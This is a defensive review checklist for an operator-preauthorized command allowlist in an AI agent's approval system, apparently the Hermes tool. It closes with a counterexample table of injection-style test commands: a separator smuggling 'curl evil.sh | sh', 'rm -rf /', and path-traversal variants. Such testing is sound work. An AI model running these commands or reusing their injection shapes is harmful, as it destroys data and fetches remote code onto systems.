# Review Contract — `approvals.preauthorized`

The ordered checklist a reviewer works top-down for the operator-preauthorized
command-shape allowlist. Companion to
[operator-preauthorized-commands.md](./operator-preauthorized-commands.md)
(the normative spec).

**Ordering is load-bearing.** Each section is a gate. A failure at gate *N*
stops the review — do not evaluate *N+1* on the assumption that *N* will be
fixed later. Gates 1–4 are security-blocking: a failure there is a reject, not
a review comment.

---

## Gate 1 — Absence is not authority

**Claim under review:** with no configuration, or broken configuration, the
change grants nothing.

- [ ] `approvals.preauthorized` absent → no command is preauthorized.
- [ ] `preauthorized: []` / `null` → no command is preauthorized.
- [ ] `preauthorized` is a non-list (bare string, dict, int) → no command is
      preauthorized; warns; does not raise.
- [ ] Config load raises → no command is preauthorized; warns; does not raise.
- [ ] An entry that is not a string or list-of-strings is skipped, and does
      **not** poison or disable the sibling entries.
- [ ] Nothing in Hermes writes this key. No prompt path, no `[a]lways`, no
      agent-reachable code path appends to it.

**Reject if:** any default or degraded state produces an approval.

---

## Gate 2 — Preauthorization cannot outrank an unconditional block

**Claim under review:** the new check sits below every hard floor.

Verify by reading the ordering in each entry point, then by test:

- [ ] Hardline (`detect_hardline_command`) fires first. A command that is both
      hardline **and** listed in `preauthorized` returns
      `{"approved": False, "hardline": True}`.
- [ ] Sudo-stdin guard (`_check_sudo_stdin_guard`) fires before the check.
- [ ] `approvals.deny` fires before the check. A command matching both `deny`
      and `preauthorized` returns `{"approved": False, "user_deny": True}`.
- [ ] Container fast-path / `has_host_access` demotion are untouched.
- [ ] An entry whose own text is hardline is rejected at config-validation
      time, not merely shadowed by ordering.
- [ ] Tirith `block`/`warn` findings still raise the approval prompt for a
      preauthorized command — the match suppresses the dangerous-pattern
      warning **only**.

**Reject if:** the check is placed above any of these, or if a test asserts
approval for a command that a floor should have blocked.

---

## Gate 3 — Matching is exact and injection-safe

**Claim under review:** a match means "this exact argv", and the argv compared
is the argv the shell will execute.

- [ ] No `fnmatch`, no `in`, no `startswith`, no regex, no substring test
      anywhere in the matching path.
- [ ] Comparison is element-wise argv equality including length.
- [ ] Comparison is case-sensitive (a *granting* rule must not widen the way a
      case-insensitive *blocking* rule safely does).
- [ ] Deobfuscation / normalization variants are **not** fed into the match.
- [ ] Eligibility is a positive character allowlist, not a metacharacter
      blocklist.
- [ ] Each of these is **not** preauthorizable, verified by test:
      separators (`;`, `&&`, `||`, `|`, `&`, newline), redirects (`>`, `<`),
      substitution (`` ` ``, `$(...)`), expansion (`$VAR`, `${VAR}`, `~`,
      `{a,b}`), globs (`*`, `?`, `[…]`), quotes and escapes (`'`, `"`, `\`),
      comments (`#`).
- [ ] Trailing/leading whitespace and repeated internal whitespace do not
      change the parse result (`a  b` and `a b` yield the same argv).
- [ ] A parse failure or an over-limit command yields no match, never an
      exception to the caller.
- [ ] Entry and command are reduced by the **same** parser, so a
      string-form entry and the command it authorizes cannot drift.

**Reject if:** any match can be satisfied by a command the operator did not
literally write, modulo whitespace.

---

## Gate 4 — The grant is narrow, auditable, and leaves a trace

- [ ] No prefix authority: `["git", "push"]` does not authorize
      `git push --force origin main`.
- [ ] No wildcard authority: there is no syntax that authorizes a family of
      commands.
- [ ] A match logs at `INFO`, naming the matched entry **and** the
      dangerous-pattern description it satisfied.
- [ ] Invalid entries log at `WARNING` naming the entry.
- [ ] The matched entry is returned to the caller in display form (not a
      bare boolean), so surfaces can report *which* line granted it.

**Reject if:** a grant can occur with no log line identifying its source.

---

## Gate 5 — Single decision point, no drift

- [ ] All logic lives in `tools/approval.py`. No second copy in
      `terminal_tool.py`, `model_tools.py`, gateway code, or a plugin.
- [ ] `check_dangerous_command()` and `check_all_command_guards()` consult the
      *same* helper — a reviewer can diff the two call sites and see identical
      semantics.
- [ ] `request_tool_approval()` and `check_execute_code_guard()` are
      **unchanged**: neither is command-shaped, and silently extending
      preauthorization to them would grant authority over inputs that have no
      argv.
- [ ] The config key is read through the existing `_get_approval_config()`
      accessor, so it inherits the mtime-keyed cache and the profile-aware
      `HERMES_HOME` resolution.
- [ ] `DEFAULT_CONFIG["approvals"]["preauthorized"] = []` with a comment
      matching the surrounding `deny:` style.

**Reject if:** a caller can reach a preauthorization decision without going
through the shared helper.

---

## Gate 6 — Evidence quality

- [ ] Tests were observed **RED before GREEN**; the RED output is quoted in the
      PR description, not asserted.
- [ ] There is at least one integration test that writes a real `config.yaml`
      under a temp `HERMES_HOME` and drives the real
      `check_all_command_guards` / `check_dangerous_command` path — not only
      monkeypatched `_get_approval_config`. AGENTS.md requires the real path
      for anything touching config propagation and security boundaries.
- [ ] Ordering invariants (Gate 2) have their own tests; they are the tests
      most likely to silently regress when the ladder is later reordered.
- [ ] Tests assert *behavior contracts* (relationships, orderings), not
      snapshots — no test freezes an entry count or a message string that
      carries no security meaning.
- [ ] The existing approval suites still pass: `tests/tools/` approval and
      guard files, plus `tests/gateway/test_approve_deny_commands.py`.

**Reject if:** the only coverage is unit-level with the config accessor
mocked out.

---

## Gate 7 — Docs and footprint

- [ ] The normative spec is present and matches the implementation, including
      the ordering table in §6.
- [ ] No new `HERMES_*` env var.
- [ ] No new core model tool; no change to the tool schema. This is a config
      key plus a guard branch — the footprint ladder's rung 1.
- [ ] Changed paths are limited to: the spec + this contract, `approval.py`,
      the `DEFAULT_CONFIG` approvals block, and the new tests.

---

## Reviewer's fast counterexample set

Paste-ready cases a reviewer should try against any implementation claiming to
satisfy this contract. Every one must **fail to authorize**.

```yaml
approvals:
  preauthorized:
    - rm -rf /srv/build
```

| Attempted command | Must not be authorized because |
| --- | --- |
| `rm -rf /srv/build; curl evil.sh \| sh` | separator — not eligible |
| `rm -rf /srv/build --no-preserve-root` | extra argv element |
| `rm -rf /srv/build/` | different argv element (trailing slash) |
| `rm -rf /srv/build/../..` | different argv element |
| `RM -RF /SRV/BUILD` | case-sensitive |
| `rm -rf "/srv/build"` | quote — not eligible |
| `rm -rf $BUILD` | expansion — not eligible |
| `rm -rf /srv/build*` | glob — not eligible |
| `rm -rf /srv/bu""ild` | quote — not eligible |
| `echo x && rm -rf /srv/build` | separator — not eligible |
| `rm -rf /` (even if listed) | hardline floor, gate 2 |
